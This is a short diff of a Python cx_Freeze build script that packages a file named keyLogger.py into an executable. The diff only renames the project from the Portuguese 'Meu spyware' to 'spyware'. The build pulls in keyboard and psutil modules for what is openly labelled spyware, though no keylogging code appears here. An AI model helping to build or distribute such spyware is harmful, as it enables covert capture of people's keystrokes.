@@ -5,9 +5,9 @@ build_exe_options = {"packages": ["os"], "includes": ["keyboard", "psutil", "req
 base = None
 
 setup(
-    name="Meu spyware",
+    name="spyware",
     version="0.1",
-    description="Um spyware",
+    description="spyware",
     options={"build_exe": build_exe_options},
     executables=[Executable("keyLogger.py", base=base)]
 )
